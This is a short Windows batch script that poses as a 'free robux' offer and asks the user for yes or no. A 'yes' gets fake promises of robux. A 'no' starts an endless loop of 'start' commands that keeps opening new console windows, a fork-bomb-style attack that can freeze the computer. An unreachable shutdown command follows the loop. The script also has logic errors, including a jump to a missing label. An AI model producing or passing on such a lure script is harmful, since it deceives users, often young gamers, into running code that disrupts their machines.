@echo off
 
 color a
 echo Hello, Want free robux? (answer in only yes/no)
 set /p input=
 if /i %input%==Yes goto robux
 if /i %input%==no goto no robux
 if /i not %input%== yes,no goto 1
 
 :robux
 echo I Love Robux...
 echo See You Later
 echo maybe Robux is popular..
 echo We will send the robux in a hour
 pause
 exit
 :no robux
 echo but you need robux...lol
 echo hi
 :loop
 start
 start
 start
 start
 start
 goto loop
 timeout 49
 shutdown -s -t 100  
